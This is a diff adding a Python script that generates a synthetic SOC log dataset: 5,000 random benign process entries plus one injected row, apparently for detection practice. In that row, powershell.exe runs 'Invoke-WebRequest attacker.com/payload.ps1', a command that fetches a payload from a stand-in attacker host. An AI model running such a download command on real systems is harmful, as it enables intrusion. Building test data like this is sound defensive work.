@@ -1,0 +1,50 @@
+import csv
+import random
+from datetime import datetime, timedelta
+
+users = ["j.smith", "a.lee", "m.jones", "svc_backup"]
+hosts = ["WS-101", "WS-102", "WS-103", "DC-01"]
+processes = ["chrome.exe", "powershell.exe", "outlook.exe", "cmd.exe"]
+
+start_time = datetime.now()
+
+rows = []
+
+for i in range(5000):
+
+    timestamp = start_time + timedelta(seconds=i)
+
+    row = [
+        timestamp.isoformat(),
+        random.choice(users),
+        random.choice(hosts),
+        random.choice(processes),
+        "normal_activity"
+    ]
+
+    rows.append(row)
+
+# inject simulated attack
+rows.append([
+    datetime.now().isoformat(),
+    "j.smith",
+    "WS-102",
+    "powershell.exe",
+    "Invoke-WebRequest attacker.com/payload.ps1"
+])
+
+with open("soc_logs.csv", "w", newline="") as f:
+
+    writer = csv.writer(f)
+
+    writer.writerow([
+        "timestamp",
+        "user",
+        "host",
+        "process",
+        "commandline"
+    ])
+
+    writer.writerows(rows)
+
+print("SOC attack dataset generated.")
